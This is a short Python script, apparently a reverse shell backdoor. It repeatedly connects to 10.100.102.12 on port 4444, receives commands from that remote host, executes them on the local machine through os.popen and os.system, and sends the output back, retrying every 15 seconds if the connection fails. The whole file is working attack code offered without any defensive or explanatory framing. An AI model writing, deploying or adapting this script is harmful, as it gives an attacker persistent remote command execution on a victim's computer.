import socket
import os
import time

while True:
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect(("10.100.102.12", 4444))

        while True:
            command = client.recv(5000).decode()
            output = os.popen(command).read()
            if os.system(command) == 1:
                client.sendall("ERROR, cant execute the command {0}".format(command).encode())
                continue

            client.sendall(output.encode())

    except:
        print("error")
        time.sleep(15)
        continue
